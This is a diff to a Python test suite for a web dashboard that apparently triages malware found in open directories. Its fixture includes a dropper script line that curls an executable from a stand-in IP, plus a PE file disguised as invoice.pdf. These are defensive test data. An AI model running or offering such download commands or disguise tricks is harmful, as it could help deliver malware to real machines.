@@ -8,7 +8,7 @@ from pathlib import Path
 
 from fastapi.testclient import TestClient
 
-from dirsift.models import Entry, ScanError, ScanResult
+from dirsift.models import Entry, Ioc, ScanError, ScanResult
 from dirsift.web import create_app
 
 BACK_TO_DASHBOARD = re.compile(r'<a[^>]*href="/"[^>]*>(?:(?!</a>).)*Back to Dashboard', re.S)
@@ -20,7 +20,7 @@ def save_run(runs_dir: Path, result: ScanResult, name: str = "run") -> str:
 
 
 def header_of(html: str) -> str:
-    match = re.search(r"<header>(.*?)</header>", html, re.S)
+    match = re.search(r"<header[^>]*>(.*?)</header>", html, re.S)
     assert match, "page has no header"
     return match.group(1)
 
@@ -123,7 +123,8 @@ def test_the_dashboard_does_not_link_back_to_itself(tmp_path: Path):
 
 def test_the_header_names_the_dashboard_and_the_brand_leads_there(tmp_path: Path):
     header = header_of(TestClient(create_app(tmp_path)).get("/").text)
-    assert re.search(r'<a[^>]*href="/"[^>]*>\s*DIRSIFT\s*</a>', header)
+    brand = re.search(r'<a[^>]*class="brand"[^>]*>(?:(?!</a>).)*DIRSIFT', header, re.S)
+    assert brand and 'href="/"' in brand.group(0)
     assert re.search(r'<a[^>]*href="/"[^>]*>\s*dashboard\s*</a>', header)
     assert not re.search(r">\s*runs\s*</a>", header)
 
@@ -172,3 +173,154 @@ def test_the_listing_shows_a_hash_and_says_when_a_read_was_partial(tmp_path: Pat
     page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
     assert "a" * 12 in page.text  # the short form of the sha256
     assert "partial" in page.text
+
+
+# -- the preview panel -----------------------------------------------------
+
+
+def run_with_a_family(runs_dir: Path) -> str:
+    """One driver, two versions of the thing it drops, and a lying extension."""
+    driver = Entry(
+        url="http://127.0.0.1:8080/install.bat",
+        name="install.bat",
+        depth=1,
+        kind="script",
+        confidence="sniffed",
+        fetched_bytes=120,
+        size=120,
+        sha256="c" * 64,
+        md5="d" * 32,
+        head_hex="4020656368",
+        text_preview="curl -o svc2.exe http://203.0.113.24/bin/svc2.exe",
+        references=["svc2.exe"],
+    )
+    dropped = Entry(
+        url="http://127.0.0.1:8080/svc2.exe",
+        name="svc2.exe",
+        depth=1,
+        kind="pe",
+        confidence="sniffed",
+        fetched_bytes=4096,
+        size=65536,
+        truncated=True,
+        head_hex="4d5a90000300",
+        cluster="svc{n}.exe",
+    )
+    sibling = Entry(
+        url="http://127.0.0.1:8080/svc3.exe",
+        name="svc3.exe",
+        depth=1,
+        kind="pe",
+        cluster="svc{n}.exe",
+    )
+    liar = Entry(
+        url="http://127.0.0.1:8080/invoice.pdf",
+        name="invoice.pdf",
+        depth=1,
+        kind="pe",
+        confidence="sniffed",
+        magic="MZ",
+        fetched_bytes=3072,
+        size=3072,
+        sha256="e" * 64,
+        md5="f" * 32,
+        head_hex="4d5a9000",
+    )
+    return save_run(
+        runs_dir,
+        ScanResult(
+            root_url="http://127.0.0.1:8080/",
+            listing_flavor="python",
+            entries=[driver, dropped, sibling, liar],
+            iocs=[
+                Ioc(
+                    ioc_type="url",
+                    value="http://203.0.113.24/bin/svc2.exe",
+                    defanged="hxxp://203[.]0[.]113[.]24/bin/svc2[.]exe",
+                    source_url="http://127.0.0.1:8080/install.bat",
+                ),
+                Ioc(
+                    ioc_type="ipv4",
+                    value="198.51.100.77",
+                    defanged="198[.]51[.]100[.]77",
+                    source_url="http://127.0.0.1:8080/other.txt",
+                ),
+            ],
+        ),
+    )
+
+
+def preview_of(client: TestClient, name: str, file_url: str) -> str:
+    return client.get(f"/runs/{name}/file", params={"url": file_url}).text
+
+
+def test_the_preview_shows_both_hashes(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
+    assert "c" * 64 in panel
+    assert "d" * 32 in panel
+
+
+def test_the_preview_says_how_much_of_a_cut_file_was_read(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
+    assert "partial" in panel.lower()
+    assert "4.0K of 64.0K" in panel
+
+
+def test_the_preview_names_a_lying_extension(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/invoice.pdf")
+    assert "pdf" in panel.lower()
+    assert "pe" in panel.lower()
+
+
+def test_the_preview_lists_only_this_files_indicators(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
+    assert "203[.]0[.]113[.]24" in panel
+    assert "198[.]51[.]100[.]77" not in panel
+
+
+def test_the_preview_links_the_files_that_reference_this_one(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
+    assert "install.bat" in panel
+
+
+def test_the_preview_offers_the_other_versions_in_the_family(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
+    assert "svc3.exe" in panel
+
+
+def test_the_preview_renders_the_first_bytes_as_hex(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
+    assert "4d 5a 90 00" in panel
+    assert "00000000" in panel  # the offset column
+
+
+def test_a_run_page_can_open_a_file_straight_from_the_address_bar(tmp_path: Path):
+    name = run_with_a_family(tmp_path)
+    page = TestClient(create_app(tmp_path)).get(
+        f"/runs/{name}", params={"file": "http://127.0.0.1:8080/install.bat"}
+    )
+    # The md5 appears in the preview panel and nowhere else on the page.
+    assert "d" * 32 in page.text
+
+
+def test_the_dashboard_counts_what_is_saved(tmp_path: Path):
+    run_with_a_family(tmp_path)
+    page = TestClient(create_app(tmp_path)).get("/")
+    assert "files" in page.text
+    assert "indicators" in page.text.lower()
+
+
+def test_the_listing_flags_a_lying_extension(tmp_path: Path):
+    """invoice.pdf that starts with MZ is the most interesting row in the listing."""
+    name = run_with_a_family(tmp_path)
+    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
+    row = re.search(r"<tr[^>]*>(?:(?!</tr>).)*invoice\.pdf(?:(?!</tr>).)*</tr>", page.text, re.S)
+    assert row, "invoice.pdf is not in the listing"
+    assert "mismatch" in row.group(0).lower()
